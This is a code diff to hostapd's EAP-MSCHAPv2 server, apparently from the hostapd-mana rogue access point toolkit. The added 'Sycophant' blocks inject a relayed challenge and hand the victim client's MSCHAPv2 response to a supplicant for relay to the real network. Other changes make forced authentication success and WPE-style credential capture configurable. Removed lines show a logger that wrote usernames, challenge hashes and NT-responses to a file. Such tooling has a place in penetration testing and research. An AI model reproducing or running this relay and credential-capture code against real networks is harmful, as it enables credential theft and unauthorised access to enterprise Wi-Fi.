@@ -13,6 +13,7 @@
 #include "crypto/random.h"
 #include "eap_i.h"
 #include <stdlib.h>
+#include "common/mana.h" //MANA
 
 struct eap_mschapv2_hdr {
 	u8 op_code; /* MSCHAPV2_OP_* */
@@ -124,6 +125,63 @@ static struct wpabuf * eap_mschapv2_build_challenge(
 	ms->op_code = MSCHAPV2_OP_CHALLENGE;
 	ms->mschapv2_id = id;
 	WPA_PUT_BE16(ms->ms_length, ms_len);
+
+	//MANA SYCOPHANT START
+	if (mana.conf->enable_sycophant && os_strcmp("NOT_SET",mana.conf->sycophant_dir) != 0) {
+		char sup_state[2] = "*";
+		FILE* sycophantState;
+		char sycophantStateFile[sizeof(mana.conf->sycophant_dir)+16];
+		os_strlcpy(sycophantStateFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
+		strcat(sycophantStateFile,"SYCOPHANT_STATE");
+		wpa_printf(MSG_DEBUG, "SYCOPHANT: Checking Sycophant State File.");
+
+		while (os_strcmp(sup_state,"C") != 0) {
+			sycophantState = fopen(sycophantStateFile,"rb");
+			if (sycophantState == NULL) {
+				wpa_printf (MSG_ERROR,"SYCOPHANT: Unable to open state file %s, not relaying",sycophantStateFile);
+				break;
+			} else {
+				fread(sup_state,1,1,sycophantState);
+				if (strcmp(sup_state,"Z") == 0) {
+					wpa_printf(MSG_DEBUG, "SYCOPHANT: State file is Z bailing!");
+					fclose(sycophantState);
+					break;
+				}
+				fclose(sycophantState);
+				usleep(10000); //Prevent thrashing
+			}
+		}
+
+		if (strcmp(sup_state,"C") == 0) {
+			wpa_printf(MSG_DEBUG, "SYCOPHANT: State file says we have a challenge.");
+			FILE* challengeIn;
+			char challengeInFile[sizeof(mana.conf->sycophant_dir)+10];
+			os_strlcpy(challengeInFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
+			strcat(challengeInFile,"CHALLENGE");
+			challengeIn = fopen(challengeInFile, "rb");
+			if (challengeIn == NULL) {
+				wpa_printf(MSG_ERROR, "SYCOPHANT: Could not open challenge file %s",challengeInFile);
+			} else {
+				fseek(challengeIn, 0, SEEK_END);
+				if (ftell(challengeIn) > 0) {
+					rewind(challengeIn);
+					u8 line [CHALLENGE_LEN];
+					fread(line, CHALLENGE_LEN, 1, challengeIn);
+					wpa_hexdump(MSG_DEBUG, "SYCOPHANT: Incoming MSCHAPv2 challenge", line, CHALLENGE_LEN);
+					memcpy(data->auth_challenge, line, CHALLENGE_LEN);
+					fclose(challengeIn);
+					// Blank file
+					challengeIn = fopen(challengeInFile, "wb");
+				} else {
+					usleep(1000); // Prevent thrashing
+				}
+				fclose(challengeIn);
+			}
+			// TODO: find replace for all these random youtube vids
+			// https://www.youtube.com/watch?v=QUNJ5TRRYqg
+		}
+	}
+	//MANA SYCOPHANT END
 
 	wpabuf_put_u8(req, CHALLENGE_LEN);
 	if (!data->auth_challenge_from_tls)
@@ -287,11 +345,9 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	u8 flags;
 	size_t len, name_len, i;
 	u8 expected[24];
-  	u8 challenge_hash1[8];
 	const u8 *username, *user;
 	size_t username_len, user_len;
 	int res;
-	int x;
 	char *buf;
 
 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
@@ -302,6 +358,52 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	end = pos + len;
 	resp = (struct eap_mschapv2_hdr *) pos;
 	pos = (u8 *) (resp + 1);
+
+	//MANA SYCOPHANT START
+	if (mana.conf->enable_sycophant && os_strcmp("NOT_SET",mana.conf->sycophant_dir) != 0) {
+		char sup_state[2] = "*";
+		FILE* sycophantState;
+		char sycophantStateFile[sizeof(mana.conf->sycophant_dir)+16];
+		os_strlcpy(sycophantStateFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
+		strcat(sycophantStateFile,"SYCOPHANT_STATE");
+		sycophantState = fopen(sycophantStateFile,"rb");
+
+		if (sycophantState != NULL) {
+			wpa_printf(MSG_DEBUG, "SYCOPHANT: Checking state file.");
+			fread(sup_state,1,1,sycophantState);
+			fclose(sycophantState);
+		} else {
+			wpa_printf (MSG_ERROR,"SYCOPHANT: Unable to open state file %s, not relaying",sycophantStateFile);
+		}
+
+		if (strcmp(sup_state,"C") == 0) {
+			wpa_printf(MSG_DEBUG, "SYCOPHANT: State file at Challenge, write the Response.");
+			FILE* responseOut;
+			char responseOutFile[sizeof(mana.conf->sycophant_dir)+9];
+			os_strlcpy(responseOutFile,mana.conf->sycophant_dir,sizeof(mana.conf->sycophant_dir));
+			strcat(responseOutFile,"RESPONSE");
+			responseOut = fopen(responseOutFile, "wb");
+			if (responseOut == NULL) {
+				wpa_printf(MSG_ERROR, "SYCOPHANT: Could not open response file %s",responseOutFile);
+			} else {
+				fwrite(respData->buf,respData->used,1,responseOut);
+				wpa_hexdump(MSG_DEBUG, "SYCOPHANT: Response to be sent to supplicant", respData->buf, respData->used);
+				fclose(responseOut);
+				// Inform of our readyness
+				sycophantState = fopen(sycophantStateFile,"wb");
+				if (sycophantState != NULL) {
+					sup_state[0] = 'R';
+					fwrite(sup_state,1,1,sycophantState);
+					fclose(sycophantState);
+					wpa_printf(MSG_INFO,"SYCOPHANT: MSCHAPv2 Response handed off to supplicant.");
+				} else {
+					wpa_printf (MSG_ERROR,"SYCOPHANT: Unable to open state file %s",sycophantStateFile);
+				}
+			}
+		}
+
+	}
+	//MANA SYCOPHANT END
 
 	if (len < sizeof(*resp) + 1 + 49 ||
 	    resp->op_code != MSCHAPV2_OP_RESPONSE ||
@@ -362,7 +464,9 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		}
 	}
 
-#ifdef CONFIG_TESTING_OPTIONS
+//MANA Start
+//#ifdef CONFIG_TESTING_OPTIONS
+	if (mana.conf->mana_wpe)
 	{
 		u8 challenge[8];
 
@@ -373,40 +477,8 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 						      challenge, nt_response);
 		}
 	}
-#endif /* CONFIG_TESTING_OPTIONS */
-
-	//MANA EAP capture
-	challenge_hash(peer_challenge, data->auth_challenge, username, username_len, challenge_hash1);
-
-	wpa_hexdump(MSG_DEBUG, "EAP-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
-	wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Username:%s", name);
-	wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Challenge");
-	printf("MANA (EAP-FAST) : ");
-	for (x=0;x<7;x++)
-                printf("%02x:",challenge_hash1[x]);
-        printf("%02x\n",challenge_hash1[7]);
-
-        wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Response");
-        printf("MANA (EAP-FAST) : ");
-        for (x=0;x<23;x++)
-                printf("%02x:",nt_response[x]);
-        printf("%02x\n",nt_response[23]);
-
-	char *ennode = getenv("MANANODE");
-	FILE *f = fopen(ennode, "a");
-	if (f != NULL) {
-		const char *hdr = "CHAP";
-		fprintf(f, "%s|%s|", hdr, name);
-		for (x = 0; x < 7; x++) {
-			fprintf(f, "%02x:", challenge_hash1[x]);
-		}
-		fprintf(f, "%02x|", challenge_hash1[7]);
-		for (x = 0; x < 23; x++) {
-			fprintf(f, "%02x:", nt_response[x]);
-		}
-		fprintf(f, "%02x\n", nt_response[23]);
-		fclose(f);
-	}
+//#endif /* CONFIG_TESTING_OPTIONS */
+//MANA End
 
 	if (username_len != user_len ||
 	    os_memcmp(username, user, username_len) != 0) {
@@ -441,7 +513,11 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		return;
 	}
 
-	os_memcpy(expected, nt_response, 24); //MANA set challenges to match
+	//MANA Start
+	if (mana.conf->mana_eapsuccess) {
+		os_memcpy(expected, nt_response, 24); //MANA set challenges to match
+	}
+	//MANA End
 	if (os_memcmp_const(nt_response, expected, 24) == 0) {
 		const u8 *pw_hash;
 		u8 pw_hash_buf[16], pw_hash_hash[16];
@@ -482,7 +558,9 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Invalid NT-Response");
 		data->state = FAILURE_REQ;
 	}
-	data->state = SUCCESS; //MANA WPE
+	if (mana.conf->mana_eapsuccess) { //MANA
+		data->state = SUCCESS; //MANA WPE
+	}
 }
 
 
